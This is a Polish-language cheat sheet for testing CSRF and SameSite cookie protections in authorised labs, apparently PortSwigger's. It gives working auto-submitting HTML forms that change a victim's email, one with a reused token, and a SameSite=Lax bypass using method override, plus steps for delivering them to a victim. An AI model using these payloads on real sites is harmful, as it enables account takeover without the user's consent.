# CSRF + SameSite Cookies Cheat Sheet

## Cel

Używaj tej checklisty podczas testowania CSRF w legalnych labach lub autoryzowanych środowiskach.

Skupiaj się na requestach zmieniających stan, np.:

- zmiana emaila,
- zmiana hasła,
- aktualizacja profilu,
- zmiana ustawień konta,
- modyfikacja danych płatniczych,
- zmiana roli lub uprawnień.

## Basic Testing Flow

1. Zaloguj się do aplikacji.
2. Wykonaj normalnie akcję zmieniającą stan.
3. Przechwyć request w Burp Suite.
4. Sprawdź:
   - metodę,
   - endpoint,
   - cookies,
   - parametry body,
   - CSRF token, jeśli istnieje,
   - nagłówki Origin i Referer.
5. Wyślij request do Repeatera.
6. Testuj, co się stanie, gdy:
   - usuniesz CSRF token,
   - zmienisz CSRF token,
   - użyjesz tokena z innej sesji,
   - odtworzysz request z zewnętrznej strony HTML.

## Basic POST CSRF HTML Form

Użyj tego, gdy endpoint przyjmuje zwykły form-encoded `POST` i nie ma poprawnej ochrony CSRF.

```html
<html>
  <body>
    <form method="POST" action="https://TARGET-LAB.web-security-academy.net/my-account/change-email">
      <input type="hidden" name="email" value="attacker@example.com">
    </form>

    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

### Co podmienić

- `TARGET-LAB.web-security-academy.net`  
  Podmień na aktualny host laba.

- `/my-account/change-email`  
  Podmień na endpoint zmieniający stan z Burpa.

- `email`  
  Podmień na prawdziwą nazwę parametru z request body.

- `attacker@example.com`  
  Podmień na nową, unikalną wartość, której wcześniej nie używałeś.

### Gdzie to wkleić

W labach PortSwigger:

1. Otwórz Exploit Server.
2. Wklej HTML do pola Body.
3. Kliknij Store.
4. Kliknij View exploit, żeby przetestować na swoim koncie.
5. Jeśli działa, kliknij Deliver exploit to victim.

## POST CSRF Form With Token

Użyj tego, gdy request wymaga CSRF tokena, ale token jest możliwy do ponownego użycia albo nie jest powiązany z sesją użytkownika.

```html
<html>
  <body>
    <form method="POST" action="https://TARGET-LAB.web-security-academy.net/my-account/change-email">
      <input type="hidden" name="email" value="attacker@example.com">
      <input type="hidden" name="csrf" value="FRESH_UNUSED_TOKEN">
    </form>

    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

### Ważne zasady

- Użyj świeżego tokena.
- Nie używaj tokena, który został już wysłany.
- Użyj unikalnego emaila.
- Najpierw potwierdź w Repeaterze, że token z jednego konta może zostać zaakceptowany z sesją innego konta.

## SameSite Lax Method Override Payload

Użyj tego, gdy bezpośredni cross-site `POST` jest blokowany przez `SameSite=Lax`, ale backend obsługuje method override.

```html
<html>
  <body>
    <script>
      document.location = "https://TARGET-LAB.web-security-academy.net/my-account/change-email?email=samesite-test@example.com&_method=POST";
    </script>
  </body>
</html>
```

### Dlaczego to działa

Przeglądarka widzi top-level navigation typu `GET`, więc `SameSite=Lax` może pozwolić na wysłanie session cookie.

Backend widzi:

```http
_method=POST
```

i traktuje request jak `POST`.

### Co sprawdzić najpierw

W Burp Repeater:

```http
GET /my-account/change-email?email=test@example.com HTTP/2
```

Jeśli dostaniesz:

```http
405 Method Not Allowed
Allow: POST
```

spróbuj:

```http
GET /my-account/change-email?email=test@example.com&_method=POST HTTP/2
```

Jeśli dostaniesz redirect do strony konta i email się zmieni, method override działa.

## Common Signals

Przydatne sygnały w response:

- `302 Found` do `/my-account` może oznaczać, że akcja się udała.
- `Invalid CSRF token` oznacza, że walidacja tokena nie przeszła.
- `Email already in use` może oznaczać, że CSRF token został zaakceptowany i request dotarł do logiki biznesowej.
- `302 Found` do `/login` zwykle oznacza brak, wygaśnięcie lub niewysłanie session cookie.

## Quick Questions

Przed uznaniem podatności za CSRF zapytaj:

- Jaka akcja zmienia stan?
- Czy request wymaga tylko session cookie?
- Czy istnieje CSRF token?
- Czy token jest powiązany z sesją użytkownika?
- Czy request można wywołać z innej strony?
- Czy SameSite blokuje lub pozwala na cookie?
- Czy method override zmienia zachowanie backendu?
